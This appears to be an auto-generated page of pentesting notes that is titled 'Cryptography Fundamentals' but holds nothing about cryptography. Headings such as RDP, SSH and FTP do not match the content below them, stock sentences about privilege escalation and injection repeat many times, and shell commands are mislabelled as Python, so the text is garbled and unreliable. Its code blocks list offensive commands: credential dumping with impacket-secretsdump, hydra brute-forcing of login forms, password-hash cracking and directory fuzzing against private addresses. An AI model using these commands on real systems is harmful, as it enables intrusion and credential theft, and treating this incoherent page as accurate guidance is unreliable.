---
TitleSEO: "Cryptography Fundamentals | ZureFX"
TitlePost: "Cryptography Fundamentals"
Author: "ZureFX"
Description: "Personal notes on Cryptography Fundamentals. Quick reference for pentesting and CTF challenges."
Keywords: "lateral movement, dfir, networking, blue team"
URL: "https://zurefx.github.io/notes/note-cryptography-fundamentals-347.html"
URL_IMAGES: ""
Date: "2024-10-27"
Tags: "Lateral Movement, DFIR, Networking, Blue Team"
Section: "notes"
Lang: "en"
main_img: "note-cryptography-fundamentals-347"
Permalink: "/notes/note-cryptography-fundamentals-347.html"
BtnLabel: "Read Notes"
Pick: 0
---
## burpsuite

### RDP

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.119.248.86
crackmapexec smb 10.35.27.123 -u administrator -p 'P@ssw0rd!' --shares
```

- `enum4linux`
- `lookupsid`
- `mimikatz`
- `DLL Hijacking`
- `Golden Ticket`
- `rubeus`

```bash
crackmapexec smb 10.124.242.14 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.88.64.26/FUZZ
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.19.182.202
```

## SSH

### socat

The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit. The backup files contained sensitive information that should not have been accessible. Command injection was possible through unsanitized user input in the search functionality.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.81.119.234/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.50.204.54/FUZZ
```

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.11.44.39/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.18.166.72 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.84.13.104 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.108.178.71/FUZZ
```

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target. The scheduled task ran with elevated privileges and could be abused for escalation.

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target. Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

## impacket

### FTP

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism. The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

The service was running without proper input validation, leading to injection vulnerabilities. Weak file permissions allowed modification of critical system files.
